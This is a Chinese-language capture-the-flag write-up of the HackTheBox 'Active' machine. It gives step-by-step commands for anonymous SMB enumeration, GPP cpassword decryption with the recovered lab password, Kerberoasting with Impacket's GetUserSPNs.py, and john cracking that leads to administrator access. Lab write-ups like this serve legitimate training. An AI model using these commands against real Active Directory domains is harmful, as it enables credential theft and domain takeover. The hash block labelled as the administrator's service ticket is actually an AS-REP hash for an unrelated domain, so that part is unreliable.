---
title: "HTB Active"
description: "HackTheBox篇Active Directory 101系列之Active"

date: 2024-07-05T09:38:14+08:00
lastmod: 2025-11-11T09:39:30+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - Kerberoasting
  - GPP
---
<!--more-->

> 靶机ip：10.10.10.100

# 知识点

* 组策略安全问题
* Kerberoasting攻击
* 组策略GPP密码解密

# 信息收集

## nmap扫描

`nmap -sS -sV -sC 10.10.10.100`

![image-20240708130022178](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708130024551-1884352902.png)

发现有`kerberos`服务，`smb`服务，`ldap`服务，域名为 `active.htb`

## SMB

`smbclient -L \\10.10.10.100`

![image-20240708131333628](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708131335828-1229634342.png)

发现匿名登陆成功，并得到一些可以访问的共享资源，进一步探测

`smbmap -H 10.10.10.100`

![image-20240708134449415](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708134451917-1771966004.png)

可以看到匿名用户对 `Replication` 文件夹具有 `READ ONLY` 权限，尝试访问

`smbclient //10.10.10.100/Replication`

![image-20240708135137253](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708135139603-190151919.png)

# 组策略GPP密码解密

> 当创建新的组策略首选项（GPP）时，在 C:\Windows\SYSVOL 中会创建一个与相关配置数据相关联的XML文件，其中包括与 GPP 关联的任何密码。为了安全起见，Microsoft AES 在将密码存储为 cpassword 但随后微软在 MSDN 上发布了密钥。
> 由于经过身份验证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的读取权限，所以域中的任何人都可以搜索包含“cpassword”的XML文件的SYSVOL共享，该文件是包含AES加密密码的值。
>
> 所有域组策略都存储在：\\ SYSVOL \\ Policies \

使用`smbclient`尝试访问该目录的文件，最后在`\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`目录下发现`Groups.xml`文件

![image-20240708141316123](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708141318506-1037427827.png)

![image-20240708141327727](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708141329701-245755982.png)

可以拿到一对用户名和`GPP`密码

`active.htb\SVC_TGS : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

由于密钥是已知的，我们可以使用`Kali`上的工具`gpp-decrypt`来解密

`gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"`

![image-20240708142457314](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708142501970-1727130224.png)

> active.htb\SVC_TGS
>
> GPPstillStandingStrong2k18

现在我们拿到了一个域用户的账号和明文密码，接下来我们再来尝试通过`SMB`登录

`smbclient //10.10.10.100/Users -U SVC_TGS`

![image-20240708144844053](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708144846574-1126980413.png)

最后在`SVC_TGS`用户的`Desktop`得到`user.txt`

![image-20240708144935287](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708144937195-1629946426.png)

![image-20240708144941529](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708144943344-1994666938.png)

# kerberoasting攻击

> 攻击原理：
>
> ​			`Kerberoasting` 是流行的 `AD Kerberos` 攻击之一，Kerberoasting 是一种允许攻击者窃取使用 RC4 加密的 `KRB_TGS` 票证的技术，以暴力破解应用程序服务哈希以提取其密码。  在此攻击中，从`Active Directory`中提取服务帐户的凭据哈希并离线破解。我们需要确定哪些帐户是`kerberoastable`，然后作为经过身份验证的用户，我们可以为目标服务帐户请求服务票证  (TGS)，而无需向运行服务的目标服务器发送任何流量。

如下图所示，`kerberoasting` 的重点是向 `KDC` 请求 `TGS`。此攻击仅涉及突出显示的步骤 3 和 4。

![Kerberos Authentication flow)](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/kerberoasting_flow.png)

可以使用`Impacket` 中的脚本`GetUserSPNs.py`来获取与`SVC_TGS`用户帐户相关联的服务的用户名列表

`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18`

![image-20240708151701799](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708151704422-1431746945.png)

这样就拿到了一张管理员服务票据（TGS）

```txt
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:58bdf4fa347723cb982bdcc37337eb8d$44fdc778d8e0f2346c7d67f5ea08324f2b3db42ec4726705e8c2b13a7bb234f5fcec23542121d7a837f4e9d4cc698f8572eb2e9ba53497d2cffd9d12a25d8db80a52e1d5547344805a85fd9d27ba14fae2dc53467ab6f41887439fde483e0506e3529190a22172243fb9bbece3c21e0f95034100c96a824c57772ee81729d53c699dd9c30c9bf130b33429af8f08aa7c54da5f6d651966bd2235a601c489c9ba37a3ae4d9a9e8166ab978bfa71ee4e4b1d22c6d7a24a6257f2a9302dfc5afc1ccb326a9904bed9f492f3dcae0e68080d7a4a8d0aa2e13a7cf2a4a14982d55cea5d844180e1b1adb490c2f792ea3fb9f4196f23f0f72fe50982c991b0064be0b7
```

使用`john`破解

将上述票据保存为`hash`，使用`john`爆破`hash`值

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`john hash -show`

![image-20240708153348021](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240708153350228-1991754535.png)

`Ticketmaster1968`

通过`smbclient`登录`administrator`

`smbclient -U administrator //10.10.10.100/Users`

![image-20240709090438584](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240709090439214-1141233570.png)

最后在`Desktop`目录拿到`root.txt`

![image-20240709090433121](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240709090433888-136269028.png)

![image-20240709090425370](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240709090426341-1460306309.png)